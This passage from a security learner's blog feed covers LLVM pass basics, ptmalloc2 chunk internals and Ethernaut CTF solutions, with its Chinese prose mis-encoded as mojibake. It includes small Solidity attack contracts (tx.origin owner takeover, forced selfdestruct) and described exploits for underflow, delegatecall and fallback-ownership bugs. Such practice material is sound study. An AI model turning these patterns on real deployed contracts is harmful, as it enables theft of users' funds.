class="comment">//æ³¨å†Œç±»Helloï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯åå­—</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼ŒHelloæ¨¡å—çš„åŠŸèƒ½ä¸ºè¾“å‡ºç¨‹åºæ‰€æœ‰çš„å‡½æ•°åæ¥ç€å°†å…¶ç¼–è¯‘ä¸ºsoæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨å†éšä¾¿å‡†å¤‡ä¸€ä¸ªCè¯­è¨€ç¨‹åºï¼Œå°†å…¶ç¼–è¯‘ä¸º<code>.ll</code>æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure>
<p>æœ€åä½¿ç”¨optåŠ è½½soæ–‡ä»¶ï¼Œæµ‹è¯•ä¸‹helloæ¨¡å—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">opt -load ./LLVMFirst.so -hello test.ll</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>LLVM PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>llvmå­¦ä¹ ï¼ˆ2ï¼‰</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Passå­¦ä¹ ï¼ˆ2ï¼‰</h1>
]]></content>
  </entry>
  <entry>
    <title>åŒºå—é“¾å®‰å…¨å…¥é—¨#2</title>
    <url>/2025/02/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-2/</url>
    <content><![CDATA[<h2 id="jfoUX">Ethernauté¶åœº</h2>
<h3 id="w0Ihj">level4</h3>
<p><strong>å…³é”®çŸ¥è¯†ç‚¹ï¼š</strong><code>tx.origin</code>å’Œ<code>msg.sender</code>çš„åŒºåˆ«</p>
<blockquote>
<h2 id="txorigin-vs-msgsender"><font style="color:rgba(0, 0, 0, 0.87);">tx.origin vs msg.sender</font>[Â¶](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)</h2>
<ul class="lvl-1">
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">è¿™é‡ŒåŒºåˆ†ä¸€ä¸‹ tx.origin å’Œ msg.sender ï¼Œmsg.sender æ˜¯å‡½æ•°çš„ç›´æ¥è°ƒç”¨æ–¹ï¼Œåœ¨ç”¨æˆ·æ‰‹åŠ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶æ˜¯å‘èµ·äº¤æ˜“çš„è´¦æˆ·åœ°å€ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„ä¸€ä¸ªæ™ºèƒ½åˆçº¦çš„åœ°å€ã€‚è€Œ tx.origin åˆ™å¿…ç„¶æ˜¯è¿™ä¸ªäº¤æ˜“çš„åŸå§‹å‘èµ·æ–¹ï¼Œæ— è®ºä¸­é—´æœ‰å¤šå°‘æ¬¡åˆçº¦å†… / è·¨åˆçº¦å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸”ä¸€å®šæ˜¯è´¦æˆ·åœ°å€è€Œä¸æ˜¯åˆçº¦åœ°å€ã€‚</font></li>
<li class="lvl-2"><font style="color:rgba(0, 0, 0, 0.87);">ç»™å®šè¿™æ ·ä¸€ä¸ªåœºæ™¯å¦‚ï¼šç”¨æˆ·é€šè¿‡åˆçº¦ A è°ƒåˆçº¦ Bï¼Œæ­¤æ—¶ï¼š</font>
<ul class="lvl-3">
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">å¯¹äºåˆçº¦ A : tx.origin å’Œ msg.sender éƒ½æ˜¯ç”¨æˆ·</font></li>
<li class="lvl-4"><font style="color:rgba(0, 0, 0, 0.87);">å¯¹äºåˆçº¦ B : tx.origin æ˜¯ç”¨æˆ·ï¼Œmsg.sender æ˜¯åˆçº¦ A</font></li>
</ul>
</li>
</ul>
<p><font style="color:rgba(0, 0, 0, 0.87);">                                                             â€”â€”CTF-WIKI</font></p>
</blockquote>
<h4 id="C2kEY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  Telephone pubclic target = Telephone(&#x27;è´¦æˆ·åœ°å€&#x27;);</span><br><span class="line">  function pwn() public&#123;</span><br><span class="line">    target.changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="lTz9G">level5</h3>
<p>**å…³é”®çŸ¥è¯†ç‚¹ï¼š**æº¢å‡ºæ”»å‡»</p>
<h4 id="cqWqf">POC</h4>
<p>ç‰ˆæœ¬0.6ï¼Œå­˜åœ¨ä¸‹ç•Œæº¢å‡ºä¸”æ— æº¢å‡ºä¿æŠ¤ï¼Œç›´æ¥è½¬21ä½¿å¾—banlances=-1å³å¯</p>
<h3 id="quy5G">level6</h3>
<p>**å…³é”®çŸ¥è¯†ç‚¹ï¼š**å§”æ‰˜è°ƒç”¨</p>
<p>å§”æ‰˜è°ƒç”¨å°±ç›¸å½“äºæŠŠå¦ä¸€ä¸ªå‡½æ•°çš„çš„ä»£ç ç…§æŠ„ç…§æ¬è¿‡æ¥ç„¶åè°ƒç”¨</p>
<h4 id="ugyxx">POC</h4>
<p>msg.dataå¡«ä¸ºpwnå‡½æ•°åœ°å€å³å¯</p>
<h3 id="dxFLn">level7</h3>
<p>**å…³é”®çŸ¥è¯†ç‚¹ï¼š**è‡ªæ¯åˆçº¦â€”â€”<code>selfdestruct</code></p>
<h4 id="V6lNY">POC</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">  function pwn(address _target) payable public &#123;</span><br><span class="line">    selfdestruct(payable(_target));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="eYpDx">level8</h3>
<p><strong>å…³é”®çŸ¥è¯†ç‚¹ï¼š<strong>åŒºå—é“¾ç‰¹æ€§â€”â€”è®°å½•</strong>å…¬å¼€é€æ˜</strong></p>
<h4 id="D5TNf">POC</h4>
<p>ç¿»è½¬è´¦è®°å½•ï¼Œå› ä¸ºåœ¨åŒºå—é“¾æµè§ˆå™¨ä¸Šæ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€é€æ˜çš„</p>
<h2 id="JrJRU">é‡å…¥æ”»å‡»</h2>
<p>æˆ‘å¯¹é‡å…¥æ”»å‡»çš„ç†è§£æ˜¯å›è°ƒå‡½æ•°ä¸­æ–­æ¡ä»¶ä¸€ç›´ä¸è¢«æ»¡è¶³è€Œå¯¼è‡´çš„å‡½æ•°é‡å¤ä¸æ–­çš„è°ƒç”¨</p>
<p>CTF-WIKIä¸Šçš„è§£é‡Šï¼š</p>
<p><a href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">Re-Entrancy - CTF Wiki</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>åŒºå—é“¾å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc2_æºç è¯¦è§£_part1</title>
    <url>/2025/08/04/ptmalloc2-%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3-part1/</url>
    <content><![CDATA[<h1>ptmalloc2æºç è¯¦è§£ Part1</h1>
<p>æœ¬ç³»åˆ—è®²è§£çš„ç‰ˆæœ¬ä¸ºGlibc2.23</p>
<p>é«˜ç‰ˆæœ¬çš„diffæ¯”å¦‚tcache binçš„å¢åŠ ç­‰ä¼šè¢«æ”¾åœ¨heap exploitationç³»åˆ—ä¸­è¿›è¡Œåˆ†æ</p>
<hr>
<p>åœ¨æ­£å¼å¼€å§‹mallocæµç¨‹åˆ†æçš„è®²è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ç‚¹åŸºç¡€çŸ¥è¯†</p>
<h2 id="Chunk">Chunk</h2>
<p>åœ¨ptmallocä¸­ï¼Œæ— è®ºæ˜¯ç”³è¯·å†…å­˜è¿˜æ˜¯é‡Šæ”¾å†…å­˜ï¼Œæ“ä½œçš„å¯¹è±¡éƒ½ä¸º<strong>å †å—(Chunk)</strong></p>
<p>å…¶åœ¨æºç ä¸­çš„ç»“æ„ä½“è¡¨ç¤ºä¸º</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªchunkç»“æ„ä½“ä¸­æœ‰å…­ä¸ªå­—æ®µï¼Œä½†æ˜¯å¯¹äºåä¸¤ä¸ªå­—æ®µï¼š<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ï¼Œåªæœ‰å¤§å°ç¬¦åˆlarge binçš„å †å—æ‰ä¼šç”¨åˆ°ï¼Œæ‰€ä»¥ä¸€ä¸ªæ™®é€šå †å—çš„æœ€å°å ç”¨ç©ºé—´ä¸º<strong>4*INTERNAL_SIZE_Tå­—èŠ‚</strong>ã€‚</p>
<blockquote>
<p>INTERNAL_SIZE_Tä¸ºæœºå™¨å­—é•¿</p>
<p>å¯¹äº64ä½æ¥è®²ï¼ŒINTERNAL_SIZE_Tçš„å¤§å°ä¸º8å­—èŠ‚ï¼Œé‚£ä¹ˆå †å—æœ€å°å ç”¨ç©ºé—´å°±ä¸º0x20å­—èŠ‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å·²ç”³è¯·å †å—åœ¨å†…å­˜ä¸­å½¢å¦‚:</span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of previous chunk, if allocated            | |</span><br><span class="line">	    			+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    			|             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h3 id="prev-size">prev_size</h3>
<p>è¿™ä¸ªå­—æ®µåªæœ‰å½“ä½åœ°å€çš„å †å—è¢«é‡Šæ”¾åæ‰ä¼šè¢«ä½¿ç”¨ï¼Œ<strong>æŒ‡ç¤ºäº†å‰ä¸€ä¸ªå †å—çš„å¤§å°</strong></p>
<p>è¿™ä¹Ÿå°±<strong>æ„å‘³ç€æ­¤å¤„ç©ºé—´æ˜¯å¯ä»¥è¢«å¤ç”¨çš„</strong>ï¼Œå³ä¸¤ä¸ªå·²åˆ†é…å †å—ï¼Œå‰ä¸€ä¸ªå †å—å¯ä»¥ä½¿ç”¨åä¸€ä¸ªå †å—çš„prev_sizeå­—æ®µçš„ç©ºé—´</p>
<h3 id="size">size</h3>
<p><strong>å½“å‰å †å—çš„å¤§å°</strong></p>
<p>åœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°<code>size</code>çš„æœ€ä½ä½æœ‰ä¸¤ä¸ªå­—ç¬¦<code>M</code>å’Œ<code>P</code>ï¼Œå…¶ä¸­ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>P(PREV_INUSE)</strong>ï¼šè¯¥ä½è¢«è®¾ç½®æ—¶ï¼Œä»£è¡¨ä¸Šä¸€ä¸ªå †å—æ˜¯ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„å †å—</p>
</li>
<li class="lvl-2">
<p>**M(IS_MMAPED)ï¼š**è¯¥ä½è¢«è®¾ç½®æ—¶ï¼Œä»£è¡¨å †å—å†…å­˜æ˜¯é€šè¿‡mmapåˆ†é…çš„</p>
</li>
</ul>
<p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªä¸Šå›¾ä¸­æœªè¢«æåˆ°çš„å­—æ®µ</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>**A(NON_MAIN_ARENA)ï¼š**è®°å½•å½“å‰å †å—æ˜¯å¦å±äºä¸»è¿›ç¨‹</p>
</li>
</ul>
<p>è¿™ä¸‰ä¸ªå­—æ®µä»é«˜ä½åˆ°ä½ä½æ’åºä¸ºï¼šA-&gt;M-&gt;P</p>
<h3 id="fdå’Œbk">fdå’Œbk</h3>
<p><strong>åŒå‘é“¾è¡¨ä¸­çš„å‰å‘å’Œåç»§æŒ‡é’ˆï¼Œåªæœ‰å½“å †å—è¢«é‡Šæ”¾æ—¶æ‰ä¼šè¢«ä½¿ç”¨</strong></p>
<p>åœ¨å †å—å¤„äº<strong>è¢«åˆ†é…çŠ¶æ€æ—¶</strong>ï¼Œä»fdå­—æ®µå¼€å§‹ä¸ºç”¨æˆ·ç©ºé—´ï¼Œå³ä¸Šå›¾ä¸­memæŒ‡å‘çš„ä½ç½®</p>
<h3 id="fd-nextsizeå’Œbk-nextsize">fd_nextsizeå’Œbk_nextsize</h3>
<p>ä½œç”¨åŒfdå’Œbkï¼Œä½†æ˜¯<strong>åªæœ‰å¤§å°å¤„åœ¨largebinåŒºé—´</strong>ä¸­çš„è¢«é‡Šæ”¾çš„å †å—æ‰ä¼šä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µ</p>
<h2 id="Chunkç›¸å…³æ“ä½œ">Chunkç›¸å…³æ“ä½œ</h2>
<p>åœ¨ptmallocä¸­ï¼Œç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°å’Œå®é™…ç”³è¯·çš„å†…å­˜å¤§å°æ˜¯ä¸ä¸€æ ·çš„</p>
<h3 id="request2size">request2size</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="line"></span><br><span class="line">/* The corresponding bit mask value */</span><br><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line"></span><br><span class="line">/* The smallest possible chunk */</span><br><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br><span class="line"></span><br><span class="line">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="line">#define MINSIZE  \</span><br><span class="line">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å‡è®¾åœ¨64ä½ä¸‹æ­¤æ—¶ç”¨æˆ·æƒ³è¦ç”³è¯·0x20å¤§å°çš„å†…å­˜</p>
<p>ptmallocä¼šä½¿ç”¨<code>request2size</code>å®å‡½æ•°æ£€æŸ¥0x20(req)+0x8(SIZE_SZ)+0xf(MALLOC_ALIGN_MASK)æ˜¯å¦å°äº0x20(MINSIZE)</p>
<p>å¦‚æœå°äºçš„è¯ï¼Œç›´æ¥è¿”å›MINSIZEç»™ç”¨æˆ·ï¼Œå¦åˆ™è¿”å›(0x20+0x8+0xf)&amp;~0xfå³0x30ç»™ç”¨æˆ·</p>
<p>è¿™ä¹Ÿå°±æ„å‘³ç€ï¼š</p>
<ol>
<li class="lvl-3">
<p><strong>å½“ç”³è¯·å°äº0x20å¤§å°å †å†…å­˜çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç›´æ¥è¿”å›0x20ç»™ç”¨æˆ·</strong></p>
</li>
<li class="lvl-3">
<p><strong>å½“ç”³è¯·å¤§äº0x20å¤§å°å †å†…å­˜çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç»™åŸæ¥ç”³è¯·å¤§å°åŠ ä¸Š0x10ï¼ˆprev_sizeå’Œsizeå­—æ®µæ‰€å ç”¨ç©ºé—´ï¼‰å¹¶ä¸”æœ€ç»ˆå¯¹å…¶åˆ°0x10</strong></p>
</li>
</ol>
<p>prev_sizeå’Œsizeå­—æ®µæ‰€å¤„ç©ºé—´å¯¹äºç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ï¼Œå› æ­¤å¯¹äºæœ€ç»ˆè¿”å›ç»™ç”¨æˆ·çš„æŒ‡é’ˆæ˜¯éœ€è¦è¿›è¡Œä¸€äº›å¤„ç†çš„</p>
<h3 id="chunk2memã€mem2chunk">chunk2memã€mem2chunk</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
<p>å¯¹äºå·²ç»åˆ†é…çš„ chunkï¼Œé€šè¿‡ chunk2mem å®æ ¹æ® chunk åœ°å€è·å¾—è¿”å›ç»™ç”¨æˆ·çš„å†…å­˜åœ°å€</p>
<p>åè¿‡æ¥é€šè¿‡ mem2chunk å®æ ¹æ® mem åœ°å€å¾—åˆ° chunk åœ°å€</p>
<p>chunk çš„åœ°å€æ˜¯æŒ‰ 2*SIZE_SZå¯¹é½çš„ï¼Œè€Œ chunk ç»“æ„ä½“çš„å‰ä¸¤ä¸ªåŸŸåˆšå¥½ä¹Ÿæ˜¯ 2*SIZE_SZ å¤§å°ï¼Œæ‰€ä»¥ï¼Œmem åœ°å€ä¹Ÿæ˜¯ 2*SIZE_SZ å¯¹é½çš„</p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>ptmallocæºç è¯¦è§£</tag>
      </tags>
  </entry>
  <entry>
    <title>åŒºå—é“¾å®‰å…¨å…¥é—¨</title>
    <url>/2025/02/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1>0x01 é’±åŒ…åˆ›å»º</h1>
<h2 id="å®‰è£…MetaMaskæ‹“å±•">å®‰è£…MetaMaskæ‹“å±•</h2>
<p>å¯ä»¥åœ¨<a href="https://chromewebstore.google.com/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn?hl=zh-CN&amp;utm_source=ext_sidebar">Chromeæ‹“å±•å•†åº—</a>ä¸‹è½½å¹¶å®‰è£…MetaMaskæ‹“å±•</p>
<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<h2 id="åˆ›å»ºé’±åŒ…">åˆ›å»ºé’±åŒ…</h2>
<p>æŒ‰ç…§æç¤ºä¸€æ­¥ä¸€æ­¥æ¥å³å¯è·å¾—ä¸€ä¸ªé’±åŒ…</p>
<h3 id="åŠ©è®°è¯">åŠ©è®°è¯</h3>
<p>åœ¨é’±åŒ…åˆ›å»ºå®Œæˆå‰ï¼ŒMetaMaskä¼šæç¤ºä½ æ˜¯å¦å¯ç”¨å®‰å…¨é€‰é¡¹ï¼ˆå³åŠ©è®°è¯ï¼‰</p>
<blockquote>
<p>åŠ©è®°è¯æ˜¯ä¸€ç»„ç”±éšæœºç”Ÿæˆçš„å•è¯ç»„æˆçš„çŸ­è¯­ï¼Œç”¨äºå¤‡ä»½å’Œæ¢å¤åŠ å¯†è´§å¸é’±åŒ…çš„ç§é’¥</p>
</blockquote>
<p>åŠ©è®°è¯å¯é€šè¿‡BIP39å·¥å…·ç”Ÿæˆ</p>
<blockquote>
<p>BIP39ï¼ˆBitcoin Improvement Proposal 39ï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç”Ÿæˆå’Œæ¢å¤åŠ å¯†è´§å¸é’±åŒ…çš„æ–¹æ³•ï¼Œé€šè¿‡ä½¿ç”¨ä¸€ç»„æ˜“äºè®°å¿†çš„å•è¯åºåˆ—ï¼Œå³åŠ©è®°è¯ã€‚è¿™äº›åŠ©è®°è¯å¯ä»¥ç”Ÿæˆç§å­ï¼Œè¿›è€Œæ´¾ç”Ÿå‡ºåŠ å¯†è´§å¸é’±åŒ…çš„ç§é’¥å’Œåœ°å€ã€‚BIP39çš„ä¸»è¦ä½œç”¨æ˜¯ç®€åŒ–ç”¨æˆ·å¤‡ä»½å’Œæ¢å¤é’±åŒ…çš„è¿‡ç¨‹ï¼ŒåŒæ—¶æé«˜å®‰å…¨æ€§ï¼Œå› ä¸ºå®ƒå…è®¸ç”¨æˆ·é€šè¿‡è®°ä½æˆ–å†™ä¸‹è¿™äº›å•è¯æ¥å¤‡ä»½ä»–ä»¬çš„é’±åŒ…ï¼Œè€Œä¸æ˜¯å¤æ‚çš„ç§é’¥å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p>BIP39å·¥å…·å®‰è£…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install hdwallet</span><br></pre></td></tr></table></figure>
<h3 id="åˆ›å»ºå®Œæˆ">åˆ›å»ºå®Œæˆ</h3>
<p>åˆ›å»ºå®Œæˆåå³å¯åœ¨Etherscanä¸ŠæŸ¥çœ‹è´¦æˆ·ä¿¡æ¯</p>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<h1>0x02 æ™ºèƒ½åˆçº¦â€”â€”Solidityè¯­è¨€</h1>
<p>Solidity æ˜¯ä¸€ç§ä¸“é—¨ç”¨äºç¼–å†™æ™ºèƒ½åˆçº¦çš„é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œä¸»è¦ç”¨äºä»¥å¤ªåŠåŠå…¼å®¹ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰çš„åŒºå—é“¾å¹³å°ï¼Œå…¶ä½œç”¨æ˜¯é€šè¿‡ä»£ç å®šä¹‰å»ä¸­å¿ƒåŒ–åº”ç”¨ï¼ˆDAppï¼‰çš„è‡ªåŠ¨åŒ–è§„åˆ™å’Œé€»è¾‘ï¼ˆå¦‚ä»£å¸å‘è¡Œã€äº¤æ˜“åè®®ç­‰ï¼‰ï¼Œå¹¶ç¡®ä¿è¿™äº›åˆçº¦åœ¨åŒºå—é“¾ä¸Šå®‰å…¨ã€é€æ˜åœ°æ‰§è¡Œã€‚</p>
<h2 id="ç¬¬ä¸€ä¸ªåˆçº¦">ç¬¬ä¸€ä¸ªåˆçº¦</h2>
<p>åœ¨çº¿IDEâ€”â€”<a href="https://remix.ethereum.org/"><strong>Remix</strong></a></p>
<p>åˆçº¦ï¼Œä½¿ç”¨Solidityè¯­è¨€ç¼–å†™ï¼š</p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>ç‰ˆæœ¬é€‰æ‹©ä¸ç¼–è¯‘ï¼š</p>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>è¿æ¥metamask:</p>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<p><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>éƒ¨ç½²åˆçº¦ï¼š</p>
<p><img src="/images/pasted-27.png" alt="upload successful"></p>
<p>ï¼ˆä½†æ˜¯ä»˜ä¸èµ·â€¦ï¼‰</p>
<h1>0x03 æµ…å°åŒºå—é“¾å®‰å…¨</h1>
<p>Ethernauté¶åœºï¼š<a href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p>
<h2 id="ç¬¬äºŒå…³-Fallback">ç¬¬äºŒå…³ Fallback</h2>
<p>åˆçº¦ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„å–é’±å‡½æ•°åŠ ä¸Šäº†<code>onlyOwner</code>ä¿®é¥°ï¼Œå³å¿…é¡»æ˜¯åˆçº¦æ‰€æœ‰è€…æ‰èƒ½å–é’±</p>
<p>ä½†æ˜¯åœ¨<code>receive()</code>å‡½æ•°ä¸­ï¼Œå½“<code>msg.value</code>å’Œ<code>contributions[msg.sender]</code>å¤§äº0æˆ‘ä»¬å°±å¯ä»¥å˜æˆåˆçº¦çš„æ‰€æœ‰è€…äº†</p>
<h3 id="PoC">PoC</h3>
<p>å…ˆcontribute1GWeiï¼Œç„¶åå†å‘åˆçº¦è½¬ä¸€ç‚¹ETHå³å¯å˜æˆowner</p>
<h2 id="ç¬¬ä¸‰å…³-Fallout">ç¬¬ä¸‰å…³ Fallout</h2>
<p>åˆçº¦ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span 